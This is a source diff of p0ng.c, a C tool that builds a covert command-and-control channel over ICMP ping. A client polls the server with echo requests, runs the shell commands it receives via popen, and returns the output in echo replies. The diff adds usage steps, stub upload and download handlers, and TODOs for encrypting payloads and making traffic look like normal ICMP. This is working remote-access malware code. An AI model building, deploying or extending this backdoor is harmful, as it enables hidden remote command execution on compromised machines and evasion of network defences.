@@ -1,5 +1,22 @@
-//只有当ICMPheader内ID匹配且ICMP-DATA域完全一致才能判别两包由关联。
-//echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
+/**
+ * Copyright (c) 2020-2021 aplyc1a <aplyc1a@protonmail.com>
+ * 
+ * How to start:
+ * step 1: gcc p0ng.c -lpthread -o p0ng
+ * step 2: echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all  #client part dont need.
+ * step 3: ./p0ng -S
+ * step 4: ./p0ng -C -s ${server_addr}
+ * step 5: Input 'help' in server part.Enjoy.
+ *
+ * @todo 大的待做需求列表:
+ * 1.支持对客户端上线管理。
+ * 2.支持ICMP payload加解密。
+ * 3.支持可交互式的设置时间参数。包括，被控端请求周期与数据传输的周期。
+ * 4.支持可交互式的设置p0ng协议数据大小。
+ * 5.支持动态的开启一个数据转发代理端口。（暂不考虑）
+ *
+ **/
+
 #include <stdio.h>
 #include <string.h>
 #include <signal.h>
@@ -42,9 +59,9 @@
 #define MAX_RETRY_TIMES          3
 #define USLEEP_TIME             400
 
-uint8_t current_work[ICMP_DATA_LEN-ICMP_DATA_PRESERVE];/*for any p1ng entity*/
-uint8_t msg2request[ICMP_DATA_LEN-ICMP_DATA_PRESERVE];/*for p1ng client*/
-uint8_t msg_received[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];/*for p1ng client*/
+uint8_t current_work[ICMP_DATA_LEN-ICMP_DATA_PRESERVE];/*for any p0ng entity*/
+uint8_t msg2request[ICMP_DATA_LEN-ICMP_DATA_PRESERVE];/*for p0ng client*/
+uint8_t msg_received[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];/*for p0ng client*/
 uint8_t debug=1,verbose=1;
 struct sockaddr_in dest_addr;
 uint8_t sockfd;
@@ -71,7 +88,6 @@ unsigned short cal_chksum(unsigned short *addr, int len) {
     answer = ~sum;
     return answer;
 }
-
 
 void print_usage(){
     printf("[shell    *] : execute linux shell command on the remote device.\n");
@@ -192,7 +208,7 @@ void check_server(uint8_t seq_num){
         count++;
     }
     memcpy(icmpdata,icmp_data_prefix,8);
-    //@todo 下面这里写的不合适，要单独建立一个requester空间用于发送。接受空间可以用current_work
+
     (void)snprintf(msg2request, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_REGULAR, 0, 0, 0, "");//实际上就是正常的ping请求    
     memcpy(icmpdata+8,msg2request,sizeof(msg2request));
     icmp_data_len=ICMP_DATA_PRESERVE+sizeof(msg2request);
@@ -219,9 +235,7 @@ void check_server(uint8_t seq_num){
 
 }
 
-//msg2request msg_received
-
-//首先判断是否是尾包，如果是那就结束。如果不是尾包，那么设一个超时时常等待。超时时常后期需要与p0ng_c2_main内设置的时常同步。
+//@todo支持对客户端回复相同data域的报文，使报文更像正常的ICMP通信。
 void show_execute_result(uint8_t *recvd_packet,uint8_t recvd_len){
     uint8_t recvpacket[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];
     uint8_t recv_doneyet=1;
@@ -252,6 +266,17 @@ void show_execute_result(uint8_t *recvd_packet,uint8_t recvd_len){
     }
 
 }
+
+//@todo server端支持upload功能
+void upload_result(uint8_t *recvd_packet,uint8_t recvd_len){
+	printf("stub upload_result\n");
+}
+
+//@todo client支持download功能
+void show_download_result(uint8_t *recvd_packet,uint8_t recvd_len){
+	printf("stub show_download_result\n");
+}
+
 
 void regular_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
     uint8_t sendpkt[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
@@ -292,7 +317,7 @@ void current_task_responcer(uint8_t *recvpacket, uint8_t pkt_size){
     recv_ip = (struct ip *) recvpacket;
     iphdrlen = (recv_ip->ip_hl)<<2;
     recv_icmp = (struct icmp *) (recvpacket + iphdrlen);
-    //需要发送的ICMP-P1NG包，包头在这里预拼接
+    //需要发送的ICMP-p0ng包，包头在这里预拼接
     send_icmp = (struct icmp*)pkt2send;
     send_icmp->icmp_type = ICMP_ECHOREPLY;
     send_icmp->icmp_code = recv_icmp->icmp_code;
@@ -300,14 +325,14 @@ void current_task_responcer(uint8_t *recvpacket, uint8_t pkt_size){
     send_icmp->icmp_seq = recv_icmp->icmp_seq;
     send_icmp->icmp_id = recv_icmp->icmp_id;
     pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
-    //下面开始拼接ICMP-P1NG的DATA域
+    //下面开始拼接ICMP-p0ng的DATA域
         
     //拷贝 ICMP时间戳 数据区的8位保留数据
     memcpy(pkt2send+ICMPHDR_LEN, recvpacket+iphdrlen+ICMPHDR_LEN, ICMP_TIMESTAMP_LEN);
     memcpy(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,
              ICMP_DATA_PRESERVE);
     memcpy(send_icmp->icmp_data,recv_icmp->icmp_data,ICMP_DATA_PRESERVE);
-    //拷贝 文件数据到P1NG的核心数据区，前面4字节是状态控制字。
+    //拷贝 文件数据到p0ng的核心数据区，前面4字节是状态控制字。
     (void)memcpy(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE, current_work, 
             sizeof(current_work));
     //ICMP头校验
@@ -334,18 +359,17 @@ uint8_t currentwork_requester(uint8_t seq_num){
         count++;
     }
     memcpy(icmpdata,icmp_data_prefix,8);
-    //@todo 下面这里写的不合适，要单独建立一个requester空间用于发送。接受空间可以用current_work
+
     memset(msg2request,0,ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
-    (void)snprintf(msg2request, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_TASK_QUERY, 0, 0, 0, "");//实际上就是正常的ping请求    
+    (void)snprintf(msg2request, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_TASK_QUERY, 0, 0, 0, "");  
     memcpy(icmpdata+8,msg2request,sizeof(msg2request));
-    icmp_data_len=ICMP_DATA_PRESERVE+sizeof(msg2request);
+    icmp_data_len = ICMP_DATA_PRESERVE+sizeof(msg2request);
     
     sendpacket_size = p0ng_pack(msg2request,seq_num,ICMP_ECHO,icmpdata,icmp_data_len);//@todo 后期考虑怎么加密payload
     if(sendto(sockfd, msg2request, sendpacket_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
         return 1;
     }
-    //signal(SIGALRM, handler);
-    //alarm( 5 ); 
+
     getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
     setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
     recv_pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);//默认等3秒
@@ -368,8 +392,8 @@ uint8_t currentwork_requester(uint8_t seq_num){
     return P0NG_SUCCESS;
 }
 
+//@todo 支持接收服务端返回的命令执行的回包。
 void do_execute_task(){
-    //msg_received   uint8_t *recvpkt, uint8_t recvpkt_len
     uint8_t pkt2send[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
     uint8_t iphdrlen;
     uint8_t pack_size;
@@ -383,8 +407,8 @@ void do_execute_task(){
     //使用msg_received解析出IP头
     recv_ip = (struct ip *) msg_received;
     iphdrlen = (recv_ip->ip_hl)*4; /*ip报头的长度标志乘4求得ip报头长度*/
-    recv_icmp = (struct icmp *) (msg_received + iphdrlen); /*越过ip报头,指向ICMP报头*/
-    //需要发送的ICMP-P1NG包，包头在这里预拼接
+    recv_icmp = (struct icmp *) (msg_received + iphdrlen); 
+    //需要发送的ICMP-p0ng包，包头在这里预拼接
     send_icmp = (struct icmp*)pkt2send;
     send_icmp->icmp_type = ICMP_ECHOREPLY;
     send_icmp->icmp_code = recv_icmp->icmp_code;
@@ -393,27 +417,25 @@ void do_execute_task(){
     send_icmp->icmp_id = recv_icmp->icmp_id;
     pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
     if(verbose||debug) printf("cmd:%s\n",msg_received+iphdrlen+28);
-//命令执行
+    
+	//命令执行
     fp = popen(msg_received+iphdrlen+28,"r");//28=24+4个校验位
     if(fp==NULL){
         printf("\033[40;31m[-]\033[0m popen error!\n");
     }
-    
-    //向 msg2send 内写数据，msg2send是函数内空间。
-    //pkt2send+
+
     while(fgets(data2send,sizeof(data2send),fp)!=NULL){
         seq_id++;
-        //下面开始拼接ICMP-P1NG的DATA域
-        
+        //下面开始拼接ICMP-p0ng的DATA域
         //拷贝 ICMP时间戳 数据区的8位保留数据
         memcpy(pkt2send+ICMPHDR_LEN, msg_received+iphdrlen+ICMPHDR_LEN, ICMP_TIMESTAMP_LEN);
         memcpy(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, msg_received+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, ICMP_DATA_PRESERVE);
         memcpy(send_icmp->icmp_data,recv_icmp->icmp_data,ICMP_DATA_PRESERVE);
-        //拷贝 文件数据到P1NG的核心数据区，前面4字节是状态控制字。
+        //拷贝 文件数据到p0ng的核心数据区，前面4字节是状态控制字。
         (void)snprintf(pkt2send + ICMPHDR_LEN + ICMP_TIMESTAMP_LEN +  ICMP_DATA_PRESERVE,
                ICMP_DATA_LEN-8, "%c%c%c%c%s", ICMP_SHELLCMD_RESULT, not_ok, seq_id, (uint8_t)strlen(data2send), data2send);
         //ICMP头校验
-        send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size); /*校验算法*/
+        send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size);
         //发送回包
         sendto(sockfd, pkt2send, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
                0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
@@ -441,16 +463,17 @@ void do_download_task(){
 }
 
 void client_dispatch_work(){
-    //目前来说current_work只用来在每次变更命令类型时存储p1ng包信息。数据传输不用它，后期考虑在日志信息中引用这段空间。
+    //目前来说current_work只用来在每次变更命令类型时存储p0ng包信息。数据传输不用它，后期考虑在日志信息中引用这段空间。
     switch(current_work[0]){
         case ICMP_SHELLCMD:
             do_execute_task();
             break;
         case ICMP_UPLOAD:
-
+            do_upload_task();
             break;
         case ICMP_DOWNLOAD:
-
+            /*download比较特殊，先给服务器回报通知可以发数据了，再接受服务器数据，最周返给服务器文件名称*/
+			do_download_task();
             break;
         case ICMP_REGULAR:
             break;
@@ -460,7 +483,7 @@ void client_dispatch_work(){
         case ICMP_UPLOAD_RESULT:
         case ICMP_DOWNLOAD_QUERY:
         default:
-            if(verbose||debug) printf("[-]recv malformed packet! p1ngtype (%x)\n",current_work[0]);
+            if(verbose||debug) printf("[-]recv malformed packet! p0ngtype (%x)\n",current_work[0]);
     }
     
 }
@@ -491,7 +514,7 @@ void p0ng_client(char *server_ip){
     /*判断是主机名还是ip地址*/
     if ((inaddr = inet_addr(server_ip)) == INADDR_NONE)
     {
-        if ((host = gethostbyname(server_ip)) == NULL) {//注意这里的括号，反复错了多次。
+        if ((host = gethostbyname(server_ip)) == NULL) {
             perror("gethostbyname error");
             exit(1);
         }
@@ -505,7 +528,7 @@ void p0ng_client(char *server_ip){
     pid = getpid();
     check_server(count);
     printf("\r\033[KConnection success!\n");
-    //@todo a loop to request current work
+
     while(1){
         reset_current_work();
         ret = currentwork_requester(count);
@@ -515,12 +538,12 @@ void p0ng_client(char *server_ip){
         if(ret == P0NG_INTERNAL_ERROR || ret == P0NG_HDR_ERROR){
             times++;
             if(times==MAX_RETRY_TIMES)
-                printf("P1NG PROTOCOL INTERNAL ERROR!\n");
+                printf("p0ng PROTOCOL INTERNAL ERROR!\n");
                 exit(0);
             continue;
         }
         count++;
-        //@todo do_task_dispatch
+
         client_dispatch_work();
         sleep(10);
     }
@@ -578,11 +601,11 @@ void p0ng_server(){
                 break;
             case ICMP_UPLOAD_RESULT://处理客户端发来的文件上传数据。
                 if(verbose||debug) printf("\r\033[KEntering @upload_responcer@\n");
-                //upload_responcer(recvpacket, pkt_size);
+                upload_result(recvpacket, pkt_size); 
                 break;
             case ICMP_DOWNLOAD_QUERY://处理客户端发来的文件下载请求，并返回文件数据。
                 if(verbose||debug) printf("\r\033[KEntering @download_responcer@\n");
-                //download_responcer(recvpacket, pkt_size);
+                show_download_result(recvpacket, pkt_size); 
                 break;
             //@todo delete such case later
             case ICMP_SHELLCMD:
@@ -595,8 +618,8 @@ void p0ng_server(){
                 
         }
         reset_current_work();
-        //@todo  check if the peer is dead. 
-        //update_heartbeats_db(client_ip);
+		//@todo 支持更新被控端的状态，会话是否已经老化死亡。
+
     } 
 }
 
@@ -632,15 +655,15 @@ void p0ng_c2_main(){
         } else {
             printf("\033[40;33m[!]\033[0munknow command! %3s..\n",p0ngcmd);
         }
-        //@todo show background message,可以考虑使用链表
-
+        //@todo show log message,记录会话及current_work内的信息。
+        //@todo 支持显示被控端的状态。(会话是否还在。)
     }
 }
 
 int main(int argc, char *argv[]){
     //p0ng-reverse
     //server: p0ng -S
-    //client: p0ng -C -s SIP
+    //client: p0ng -C -s server_addr
 
     int32_t opt=0;
     uint8_t server_ip[16]="192.168.199.202";
